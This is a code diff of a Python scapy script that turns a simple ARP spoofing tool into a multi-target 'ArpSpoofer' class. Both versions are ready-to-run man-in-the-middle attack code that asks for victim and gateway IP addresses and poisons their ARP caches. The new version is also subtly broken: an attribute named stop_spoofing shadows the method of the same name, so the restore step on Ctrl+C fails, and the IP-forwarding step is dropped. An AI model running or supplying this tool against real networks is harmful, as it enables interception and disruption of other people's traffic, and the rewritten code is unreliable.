@@ -1,83 +1,87 @@
-from scapy.all import Ether, ARP, srp, send
-import argparse
+from scapy.all import ARP, Ether, sendp, srp
 import time
-import os
-import sys
+import threading
 
-# enable ip routing for linux
-def enable_linux_iproute():
-    file_path = "/proc/sys/net/ipv4/ip_forward"  # Corrected path
-    with open(file_path) as f:
-        if f.read().strip() == '1':  # Ensure it's a string comparison
+class ArpSpoofer:
+    def __init__(self, target_ips, gateway_ip, interface):
+        self.target_ips = target_ips  # List of victim IPs to spoof
+        self.gateway_ip = gateway_ip  # Gateway (router) IP address
+        self.interface = interface    # Network interface (e.g., 'eth0')
+        self.stop_spoofing = False
+
+    def get_mac(self, ip):
+        """
+        Retrieves the MAC address for the given IP address.
+        """
+        pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
+        ans, _ = srp(pkt, timeout=3, iface=self.interface, verbose=False)
+        if ans:
+            return ans[0][1].hwsrc
+        return None
+
+    def spoof(self, target_ip, spoof_ip):
+        """
+        Sends ARP spoof packets to the target, telling it that we are the gateway.
+        """
+        target_mac = self.get_mac(target_ip)
+        if not target_mac:
+            print(f"[!] Could not find MAC for {target_ip}")
             return
-    with open(file_path, 'w') as f:
-        f.write('1')  # Enable IP forwarding
+        
+        arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+        sendp(Ether(dst=target_mac) / arp_response, iface=self.interface, verbose=False)
+        print(f"[+] Sent ARP spoof packet to {target_ip}: {spoof_ip} is-at {self.get_mac(spoof_ip)}")
 
-# enable ip routing for windows
-def enable_windows_iproute():
-    from services import WService
-    service = WService("RemoteAccess")
-    service.start()
+    def restore(self, target_ip, spoof_ip):
+        """
+        Restores the original ARP mapping by sending correct ARP response.
+        """
+        target_mac = self.get_mac(target_ip)
+        spoof_mac = self.get_mac(spoof_ip)
+        if target_mac and spoof_mac:
+            arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
+            sendp(Ether(dst=target_mac) / arp_response, iface=self.interface, verbose=False)
+            print(f"[+] Restored ARP for {target_ip}: {spoof_ip} is-at {spoof_mac}")
 
-# verifying ip routing
-def enable_ip_route(verbose=True):
-    if verbose:
-        print("[!] Enabling IP Routing....")
-    if os.name == "nt":
-        enable_windows_iproute()
-    else:
-        enable_linux_iproute()  # Call the function properly
-
-    if verbose:
-        print("[!] IP Routing enabled.")
-
-def get_mac(ip):
-    # Return MAC address of any device connected
-    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip), timeout=3, verbose=0)
-    
-    if ans:
-        return ans[0][1].src 
-
-def spoof(target_ip, host_ip, verbose=True):
-    # Get MAC address of the target, craft the malicious ARP reply(response) packet, and then send it.
-    target_mac = get_mac(target_ip)
-    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
-    send(arp_response, verbose=0)
-
-    if verbose:
-        self_mac = ARP().hwsrc
-        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))
-    
-def restore(target_ip, host_ip, verbose=True):
-    # Restoring the normal process of a regular network.
-    target_mac = get_mac(target_ip)  # Target MAC 
-    host_mac = get_mac(host_ip)  # Get the real MAC address of spoofed (gateway, i.e router)
-    
-    # Crafting the restoring packet
-    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")
-    
-    # Sending restoring packet
-    send(arp_response, verbose=0, count=7)
-    if verbose:
-        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))
-
-if __name__ == "__main__":
-    target = input("Enter the victim IP address: ")
-    host = input("Enter the gateway IP address: ")
-    verbose = True  # Print progress on screen
-    
-    enable_ip_route(verbose)  # Properly call the IP route enable function
-
-    try:
-        while True:
-            # Telling the 'target' that we are the 'host'
-            spoof(target, host, verbose)
-            # Telling the 'host' that we are the 'target'
-            spoof(host, target, verbose)
-
+    def start_spoofing(self):
+        """
+        Start ARP spoofing all target IPs.
+        """
+        while not self.stop_spoofing:
+            for target_ip in self.target_ips:
+                self.spoof(target_ip, self.gateway_ip)
+                self.spoof(self.gateway_ip, target_ip)
             time.sleep(1)
 
-    except KeyboardInterrupt:
-        print("[!] Detected CTRL+C! Restoring the network, please wait...")
-        restore(target, host)
-        restore(host, target)
+    def stop_spoofing(self):
+        """
+        Stop ARP spoofing and restore ARP tables.
+        """
+        self.stop_spoofing = True
+        for target_ip in self.target_ips:
+            self.restore(target_ip, self.gateway_ip)
+            self.restore(self.gateway_ip, target_ip)
+        print("[+] Stopped spoofing and restored ARP tables.")
+
+    def run(self):
+        spoof_thread = threading.Thread(target=self.start_spoofing)
+        spoof_thread.start()
+        try:
+            while True:
+                time.sleep(0.5)
+        except KeyboardInterrupt:
+            self.stop_spoofing()
+            spoof_thread.join()
+
+if __name__ == "__main__":
+    gateway_ip = input("Enter the gateway : ") 
+    target_ips = input("Enter the target ip's: ")
+
+    # Split the input string into a list of strings
+    target_ips = target_ips.split()
+
+    print(target_ips)
+    interface = "wlan0"  # Replace with your network interface
+    
+    spoofer = ArpSpoofer(target_ips, gateway_ip, interface)
+    spoofer.run()
